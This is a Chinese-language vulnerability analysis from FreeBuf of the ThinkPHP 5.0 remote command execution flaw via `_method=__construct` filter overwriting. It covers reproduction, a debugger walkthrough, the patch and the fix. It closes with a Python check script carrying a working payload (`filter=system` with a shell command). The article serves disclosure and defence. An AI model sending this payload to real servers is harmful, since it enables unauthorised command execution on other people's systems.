***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

 ***本文作者：小纨绔，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

 **ThinkPHP 5.0 版本是一个颠覆和重构版本，也是ThinkPHP 十周年献礼版本，基于 PHP5.4 设计（完美支持 PHP7
），采用全新的架构思想，引入了很多的 PHP 新特性，优化了核心，减少了依赖，支持Composer ，实现了真正的惰性加载，并且为 API
开发做了深入的支持，在功能、性能以及灵活性方面都较为突出 。**

## 漏洞描述

ThinkPHP5.0在核心代码中实现了表单请求类型伪装的功能，该功能利用`$_POST['_method']`变量来传递真实的请求方法，当攻击者设置`$_POST['_method']=__construct`时，Request类的method方法便会将该类的变量进行覆盖，攻击者利用该方式将filter变量覆盖为system等函数名，当内部进行参数过滤时便会进行执行任意命令。

## 影响范围

ThinkPHP 5.0.0 ~ ThinkPHP 5.0.23

## 什么是表单请求类型伪装

    
    
    <form method="post" action="">  
        <input type="text" name="name" value="Hello">  
        <input type="hidden" name="_method" value="PUT" >  
        <input type="submit" value="提交">  
    </form>

如上表单，可以在`POST`表单里面提交`_method`变量，传入需要伪装的请求类型
，该请求从客户端看来是POST请求，而服务器会将该请求识别PUT请求并进行处理，其中变量`_method`可以在`application\config.php`文件中进行修改。

    
    
    // 表单请求类型伪装变量  
    'var_method'             => '_method',

该特性的作用：

> 安全防护 ，隐藏自己真实请求信息；
>
> 整合现有应用系统 ，例如现有的应用系统A的接口只接受put请求，而你的应用系统B只能发起post请求。

## 漏洞复现

### 环境

    
    
    OS        : windows7  
    Webserver : phpstudy  (apache + php5.6.27)  
    thinkphp  : 5.0.20

### 条件

    
    
    // 开启thinkphp的调试模式， 文件application\config.php  
    // 应用调试模式  
    'app_debug'              => true,

### 操作

    
    
    cd D:\phpStudy\WWW  
    git clone https://github.com/top-think/think tp5  
    git checkout v5.0.22  
    cd tp5  
    git clone https://github.com/top-think/framework thinkphp  
    git checkout v5.0.22

开启thinkphp的debug模式

    
    
    // 开启thinkphp的调试模式， 文件application\config.php  
    // 应用调试模式  
    'app_debug'              => true,

开启apache，发送payload：

![](https://image.3001.net/images/20190113/1547343577_5c3a96d9c66f6.png!small)

## 漏洞分析

利用xdebug+phpstorm进行调试，配置方式请大家自行搜索。

thinkphp采用filter对请求参数进行过滤，默认的filter在config.php中为空字符串，thinkphp首先会设置默认的过滤函数：

![](https://image.3001.net/images/20190113/1547343681_5c3a9741be11e.png!small)![](https://image.3001.net/images/20190113/1547343690_5c3a974a71d81.png!small)

filter被设置为空字符串，继续跟踪在路由检查内部会对Request类的filter变量进行覆盖，跟进routeCheck函数。

![](https://image.3001.net/images/20190113/1547343916_5c3a982c1bb4b.png!small)![](https://image.3001.net/images/20190113/1547343922_5c3a9832dd821.png!small)

再上图中调用`$requesr->method()`关键方法，跟进：

![](https://image.3001.net/images/20190113/1547343958_5c3a9856d48e2.png!small)

可以发现该函数会获取用户传入的`_method=__construct`变量，并调用`__construct`方法，跟进：

![](https://image.3001.net/images/20190113/1547343990_5c3a9876e9c44.png!small)

filter变量被设置成`system`，继续：

![](https://image.3001.net/images/20190113/1547344019_5c3a98939b72e.png!small)

当debug模式开启时，会记录请求信息，会调用`$request->param()`方法，跟进：

![](https://image.3001.net/images/20190113/1547344046_5c3a98aebb2d4.png!small)![](https://image.3001.net/images/20190113/1547344051_5c3a98b33e958.png!small)

如上，根据filter变量设置过滤器，跟进：

![](https://image.3001.net/images/20190113/1547344083_5c3a98d35d3ca.png!small)

过滤器变成了数组`['system']`，跟进`array_walk_recursive`函数：

![](https://image.3001.net/images/20190113/1547344098_5c3a98e24509f.png!small)

该函数内会对参数进行过滤，调用了`call_user_func('system', 'dir')`，完成了命令执行，结果如下：

![](https://image.3001.net/images/20190113/1547344109_5c3a98ed73d6b.png!small)

接下来，thinkphp在执行模块的过程中还会再一次设置默认filter，使得`filter=''`，但是不会再次覆盖filter为system，所以接下来的一次过滤并没有能够再次执行命令。

![](https://image.3001.net/images/20190113/1547344146_5c3a9912e2fbf.png!small)![](https://image.3001.net/images/20190113/1547344152_5c3a991895216.png!small)

整个执行流程如下 ：  
![](https://image.3001.net/images/20190113/1547344168_5c3a99286bb52.png!small)

## 官方补丁

官方补丁中限制了`_method`可疑设置的请求方法，并在处理`_method`之后将其unset，无法再利用`__construct`进行变量覆盖。

![](https://image.3001.net/images/20190113/1547344720_5c3a9b50aca05.png!small)

## 漏洞修复

升级到5.0.24及以上，不用开启debug模式。

## 检测脚本

    
    
    # coding=utf-8  
    import requests  
    ​  
    def check(ip, port, timeout=3):  
        url = 'http://{ip}:{port}/tp5/public/index.php'.format(ip=ip, port=port)  
        # url = 'http://{ip}:{port}/index.php'.format(ip=ip, port=port)  
        data = {  
            '_method':'__construct',  
            'filter':'system',  
            'a':'echo abcd',  
        }  
    ​  
        headers = {  
            'content-type' : 'application/x-www-form-urlencoded',  
            'user-agent' : 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36',  
            'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'  
        }  
    ​  
        resp = requests.post(url, data=data, headers=headers, timeout=timeout)  
        if resp.content.find('abcd') != -1:  
            return 'thinkphp5.0 命令执行：' + url  
    ​  
    if __name__ == '__main__':  
        print check('127.0.0.1', '80')

## 总结

该漏洞主要是：

> 表单请求类型伪装 + filter参数 = 覆盖变量filter；
>
> 变量覆盖filter + debug模式 + 执行filter = 命令执行。

 ***本文作者：小纨绔，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

